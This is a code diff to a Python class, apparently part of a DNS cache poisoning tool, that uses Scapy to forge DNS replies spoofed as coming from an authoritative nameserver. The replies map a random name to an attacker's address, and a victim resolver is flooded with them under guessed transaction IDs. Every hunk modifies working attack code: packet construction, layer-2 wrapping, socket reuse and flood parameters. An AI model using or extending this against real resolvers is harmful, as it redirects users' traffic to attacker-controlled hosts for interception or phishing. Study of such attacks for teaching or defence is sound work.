@@ -90,6 +90,7 @@ class DNSPoisoning:
         self.source_port = sport
 
         self.flood_pool = None
+        self.flood_socket = None
 
         if socket is not None:
             self.flood_socket = socket
@@ -209,7 +210,7 @@ class DNSPoisoning:
         if ID is None:
             ID = self.id
 
-        crafted_response = Ether()/IP(dst=self.victim_server, src=self.auth_nameserver)\
+        crafted_response = IP(dst=self.victim_server, src=self.auth_nameserver)\
             /UDP(dport=self.source_port, sport=53)\
                 /DNS(id=ID,\
                     qr=1,\
@@ -221,9 +222,10 @@ class DNSPoisoning:
                         DNSRR(rrname=self.random_url, rdata=self.attacker_ip, type="A", rclass="IN", ttl=self.ttl)\
                 )  
 
+
         if victim_mac is not None:
             # Use layer 2 packets
-            crafted_response[Ether].dst=self.victim_mac 
+            crafted_response = Ether(dst=self.victim_mac)/crafted_response
 
         return crafted_response
 
@@ -265,7 +267,8 @@ class DNSPoisoning:
         if ID is None:
             ID = self.id
 
-        dan_crafted_response = Ether()/IP(dst=self.victim_server, src=self.auth_nameserver)\
+
+        dan_crafted_response = IP(dst=self.victim_server, src=self.auth_nameserver)\
             /UDP(dport=self.source_port, sport=53)\
                 /DNS(id=ID,\
                     qr=1,\
@@ -280,7 +283,7 @@ class DNSPoisoning:
         
         if victim_mac is not None:
             # Use layer 2 packets
-            dan_crafted_response[Ether].dst=self.victim_mac 
+            dan_crafted_response = Ether(dst=self.victim_mac)/dan_crafted_response
 
         return dan_crafted_response
 
@@ -348,9 +351,13 @@ class DNSPoisoning:
     #   @param socket           The socket to be used, if none is passed then a new socket is opened
     #
     #   Start the normal flooding attack which uses IP layer packets
-    #   @todo: Check that maximum int value do not surpass 65535 (max 16 bit value)
+    #   
     #
-    def start_flooding(self, number_of_guess=10, spacing=2, socket=None):
+    def start_flooding(self, number_of_guess=2, spacing=None, socket=None):
+
+        if spacing is None:
+            spacing = random.randint(1,5)
+
 
         start_id = self.id +spacing
         end_id = (self.id + number_of_guess + spacing) % 65535-1
@@ -359,13 +366,9 @@ class DNSPoisoning:
 
         self.log("\nUsing ID from {t.bold}{t.blue}" + str(start_id) + "{t.normal} to {t.bold}{t.blue}" + str(end_id) + "{t.normal}\n",2)
 
-        #Taken from that: https://byt3bl33d3r.github.io/mad-max-scapy-improving-scapys-packet-sending-performance.html 
-
-
         pkts = []
 
         # Ask the query to the random url
-        self.sport = random.randint(1024, 65536-1)
         query = IP(dst=self.victim_server)/UDP(dport=53, sport=self.sport)/DNS(id=random.randint(10,1000), rd=1,qd=DNSQR(qname=self.random_url))
         pkts.append(query)
 
@@ -378,15 +381,14 @@ class DNSPoisoning:
 
             pkts.append(crafted_response)
 
-
         self.log("Same socket for faster flood...", 3)
-        if socket is None:    
-            if self.flood_pool is None:
+        if socket is None:
+            self.open_socket()
+            if self.flood_socket is None:    
                 self.open_socket()
-
             socket = self.flood_socket
 
-        send(pkts, socket=socket)
+        send(pkts, socket=socket, verbose=1)
 
         self.log("Flood finished", 2)
 
